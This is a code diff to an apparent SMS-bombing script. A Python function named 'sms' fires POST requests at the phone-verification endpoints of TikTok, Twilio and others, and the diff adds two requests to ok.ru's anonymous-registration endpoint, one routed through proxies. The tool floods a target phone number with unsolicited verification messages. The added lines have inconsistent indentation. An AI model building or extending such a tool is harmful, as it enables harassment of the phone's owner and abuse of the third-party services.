@@ -132,6 +132,11 @@ def sms(prx, number, tm, code):
 					pass
 
 				try:
+		    		requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": '+'+number}, headers = header, proxies = proxies)
+		    	except:
+		    		pass
+
+				try:
 					requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": code, "Mobile": number[1:], "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=header, proxies=proxies)
 				except:
 					pass
@@ -291,6 +296,11 @@ def sms(prx, number, tm, code):
 				    requests.post("https://www.twilio.com/signup/v2/phone-number/verification/sms", json=payload)
 				except:
 				    pass
+
+				try:
+		    		requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": '+'+number}, headers = header)
+		    	except:
+		    		pass
 
 				try:
 				    payload = {
